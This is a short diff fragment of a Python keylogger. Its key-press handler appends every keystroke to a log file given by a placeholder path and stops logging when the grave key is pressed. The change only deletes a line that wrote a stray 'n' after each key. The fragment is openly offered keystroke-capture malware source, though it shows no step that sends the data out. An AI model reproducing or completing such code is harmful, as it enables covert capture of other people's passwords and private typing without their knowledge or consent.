@@ -10,7 +10,6 @@ log_file=r'<input path to writable file here>'
 def OnKeyPress(event):
   fob=open(log_file,'a')
   fob.write(event.Key)
-  fob.write('n')
 
   if event.Ascii==96: #96 is the ascii value of the grave key (`)
     fob.close()
